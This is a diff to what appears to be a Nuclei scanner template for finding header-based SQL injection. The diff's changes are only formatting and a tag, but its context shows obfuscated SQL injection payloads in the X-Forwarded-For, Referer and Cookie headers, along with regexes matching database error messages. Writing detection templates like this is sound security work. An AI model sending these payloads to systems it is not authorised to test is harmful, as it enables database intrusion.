@@ -4,8 +4,9 @@ info:
   name: Request header based sqli
   author: panch0r3d (Thanks https://github.com/MR-pentestGuy for all of the Regexes)
   severity: high
+  tags: sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/"
@@ -16,6 +17,7 @@ requests:
       X-Forwarded-For: "-1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'"
       Referer: "-1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'"
       Cookie: "-1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'"
+
     matchers-condition: and
     matchers:
       - type: regex
@@ -41,6 +43,7 @@ requests:
           - "(sqlite3.OperationalError:|SQLite3.*?SQLException|org.sqlite.JDBC|Sqlite|SQLiteException|Warning.*?sybase_)"
           - "(Sybase message|Sybase.*?Server message|SybSQLException|Sybase.Data.AseClient|com.sybase.jdbc)"
         part: body
+
     extractors:
       - type: regex
         part: body
